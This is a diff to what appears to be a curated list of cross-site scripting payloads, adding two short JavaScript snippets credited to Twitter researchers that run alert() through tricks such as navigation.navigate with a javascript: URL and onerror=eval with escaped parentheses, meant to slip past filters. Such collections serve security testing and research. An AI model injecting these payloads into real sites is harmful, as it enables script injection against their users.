@@ -44,6 +44,12 @@ xss.html
 
 ---
 
+[Garethheyes](https://twitter.com/garethheyes/status/1536796812073476097?s=20&t=dPlXor6lWkKtDil629FLJg)
+
+    navigation.navigate`javascript:alert(23)`
+
+---
+
 [Garethheyes](https://twitter.com/garethheyes/status/1408510651321012227?)
 
     var{haha:onerror=alert}=0;throw 1
@@ -83,6 +89,12 @@ Only Firefox [h43z](https://twitter.com/h43z)
 Only Firefox [h43z](https://twitter.com/h43z)
 
     throw onerror=eval,Error`alert\x2843\x29`
+
+----
+
+[h43z](https://twitter.com/h43z)
+
+    throw Uncaught=onerror=eval,e=Error`*/;alert\x281\x29`,e.name='/*',e
 
 ----
 
